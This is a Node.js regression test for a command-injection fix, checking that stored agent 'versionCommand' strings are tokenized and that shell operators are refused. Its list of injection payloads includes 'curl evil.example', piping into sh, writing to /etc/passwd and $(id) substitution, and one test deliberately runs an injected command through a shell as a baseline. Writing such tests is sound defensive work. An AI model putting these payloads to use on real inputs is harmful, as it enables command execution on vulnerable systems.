import test from "node:test";
import assert from "node:assert/strict";
import { existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

/**
 * `POST /api/acp/agents` stores a `versionCommand` string that the agent cache then executes on
 * every refresh — including the refresh the write itself triggers. That execution used `execSync`,
 * which runs its argument through a shell, so a stored `foo --version; rm -rf x` ran both halves.
 *
 * The command is now tokenized before execution and rejected outright when it is not a plain
 * `binary arg arg` invocation, so there is no shell for a stored string to reach.
 */

const { parseVersionCommand, isValidVersionCommand, needsShellForExec } =
  await import("../../src/lib/acp/version-command.ts");

test("a plain command tokenizes into argv", () => {
  assert.deepEqual(parseVersionCommand("claude --version"), ["claude", "--version"]);
  assert.deepEqual(parseVersionCommand("  codex   --version  "), ["codex", "--version"]);
  assert.deepEqual(parseVersionCommand("q --version"), ["q", "--version"]);
});

test("every built-in version command survives tokenization", async () => {
  const registrySource = await import("node:fs").then((fs) =>
    fs.readFileSync("src/lib/acp/registry.ts", "utf-8")
  );
  const commands = [...registrySource.matchAll(/versionCommand: "([^"]+)"/g)].map((m) => m[1]);

  assert.ok(commands.length >= 13, `expected the built-in agent list, found ${commands.length}`);
  for (const command of commands) {
    assert.ok(parseVersionCommand(command), `built-in command must stay runnable: ${command}`);
  }
});

test("shell operators are refused", () => {
  const injections = [
    "claude --version; touch /tmp/pwned",
    "claude --version && curl evil.example",
    "claude --version | sh",
    "claude --version > /etc/passwd",
    "claude --version `id`",
    "claude --version $(id)",
    "claude --version & id",
    "claude --version\nid",
    "sh -c 'id'",
    'sh -c "id"',
  ];

  for (const command of injections) {
    assert.equal(parseVersionCommand(command), null, `must refuse: ${command}`);
    assert.equal(isValidVersionCommand(command), false);
  }
});

test("empty and non-string commands are refused", () => {
  for (const command of ["", "   ", null, undefined, 42, {}, []]) {
    assert.equal(parseVersionCommand(command), null);
  }
});

/**
 * The regression itself: the old code path would have run the injected half. This asserts the
 * shell never sees it, by proving the side effect does not happen.
 */
test("an injected command does not execute through the detection path", async (t) => {
  if (process.platform === "win32") {
    t.skip("POSIX shell semantics");
    return;
  }

  const marker = join(tmpdir(), "routiform-acp-injection-marker");
  rmSync(marker, { force: true });

  const injected = `echo hi; touch ${marker}`;

  // Old behaviour, reproduced: a shell runs both halves.
  const { execSync, execFileSync } = await import("node:child_process");
  execSync(injected, { stdio: ["pipe", "pipe", "pipe"] });
  assert.equal(existsSync(marker), true, "baseline: a shell does execute the injected half");
  rmSync(marker, { force: true });

  // New behaviour: the command never tokenizes, so nothing is executed at all.
  const argv = parseVersionCommand(injected);
  assert.equal(argv, null, "the injected command must be refused before execution");

  // And even a tokenized command runs without a shell on this platform.
  assert.equal(needsShellForExec(), false);
  const safe = parseVersionCommand(`echo hi; touch ${marker}`.replace(/;.*/, "").trim());
  assert.ok(safe);
  execFileSync(safe[0], safe.slice(1), { stdio: ["pipe", "pipe", "pipe"], shell: false });
  assert.equal(existsSync(marker), false, "no shell means no side effect");
});
